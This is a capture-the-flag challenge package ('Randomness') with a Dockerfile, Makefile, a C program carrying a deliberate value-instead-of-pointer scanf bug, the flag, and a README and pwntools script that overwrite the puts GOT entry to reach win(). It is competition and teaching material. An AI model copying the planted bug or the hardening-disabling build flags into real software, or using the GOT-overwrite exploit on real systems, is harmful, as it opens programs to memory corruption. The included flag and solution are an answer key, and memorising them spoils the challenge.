{
    "Dockerfile": "FROM debian:buster-slim as build\n\nARG name\n\nRUN apt-get update -y; apt-get install build-essential -y\nADD $name.c /tmp/$name.c\nADD Makefile /tmp/Makefile\nRUN cd /tmp/; make all\n\nFROM debian:buster-slim\n\nARG name\nARG port\n\nRUN apt-get update -y; apt-get install socat -y\nCOPY --from=build /tmp/$name /pwn/$name\nCOPY flag.txt /pwn/flag.txt\nWORKDIR /pwn\n\nEXPOSE $port\n\nRUN echo \"exec socat -s TCP-LISTEN:$port,reuseaddr,fork EXEC:/pwn/$name,stderr\" > /pwn/docker_entrypoint.sh\n\nENTRYPOINT [\"sh\", \"/pwn/docker_entrypoint.sh\"]\n\n",
    "flag.txt": "gigem{value_or_pointer_is_an_important_distinction}\n",
    "Makefile": "NAME := randomness\nPORT := 6970\nCFLAGS := -Wl,-z,norelro -no-pie -fno-stack-protector\n\nall:\n\tgcc $(NAME).c -o $(NAME) $(CFLAGS)\n\ndocker: Dockerfile $(NAME)\n\tdocker build -t $(NAME) --build-arg name=$(NAME) --build-arg port=$(PORT) .\n\nrun: docker\n\tdocker run -d --read-only --restart=always --name $(NAME) -p $(PORT):$(PORT) $(NAME)\n\nclean:\n\tdocker rm -f $(NAME)\n\tdocker rmi $(NAME)\n\trm $(NAME)\n\nextract: docker\n\t$(eval id := $(shell docker create $(NAME)))\n\tdocker cp $(id):/pwn/$(NAME) - | tar xv $(NAME)\n\tdocker rm -v $(id)\n\ndist: extract\n\tzip $(NAME).zip $(NAME) $(NAME).c\n",
    "randomness.c": "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n\nvoid win() {\n    char* argv[] = {\"/bin/cat\", \"flag.txt\", NULL};\n    execve(argv[0], argv, NULL);\n}\n\nvoid foo() {\n    unsigned long seed;\n    puts(\"Enter a seed:\");\n    scanf(\"%lu\", &seed);\n    srand(seed);\n}\n\nvoid bar() {\n    unsigned long a;\n\n    puts(\"Enter your guess:\");\n    scanf(\"%lu\", a);\n\n    if (rand() == a) {\n        puts(\"correct!\");\n    } else {\n        puts(\"incorrect!\");\n    }\n}\n\n\nint main() {\n    puts(\"hello!\");\n    foo();\n    bar();\n    puts(\"goodbye!\");\n}\n",
    "README.md": "# Randomness\n\nAuthor: `anomie`\n\nI made this program to test how srand and rand work, but it keeps segfaulting. I don't read compiler warnings so I can't figure out why it's broken.\n\n## Dev Notes\nRun server with `make run`, default port is 6970. Competitors are given source (`randomness.c`) and binary (`randomness`). Get binary with `make extract`\n\n## Solution\nLet's look at `bar()` from the source:\n```c\nunsigned long a;\n\nputs(\"Enter your guess:\");\nscanf(\"%lu\", a);\n```\nHere, `scanf()` requires a pointer to a destination, but the value of the destination is passed instead. Furthermore, since `a` is uninitialized, it contains the value loaded in as the seed in `foo()`. Thus, we can write an arbitrary integer anywhere. Since `main()` calls `puts()` after the write, we can overwrite the GOT entry for `puts()` to be `win()`. See `solve.py` for details.\n",
    "solve.py": "from pwn import *\n\nelf = ELF(\"./randomness\")\n\ncontext.log_level = \"DEBUG\"\ncontext.binary = elf\n\np = remote(\"localhost\", 6970)\np.sendline(str(elf.got[\"puts\"]).encode())\np.sendline(str(elf.sym[\"win\"]).encode())\np.clean()\n",
    "category": "pwn"
}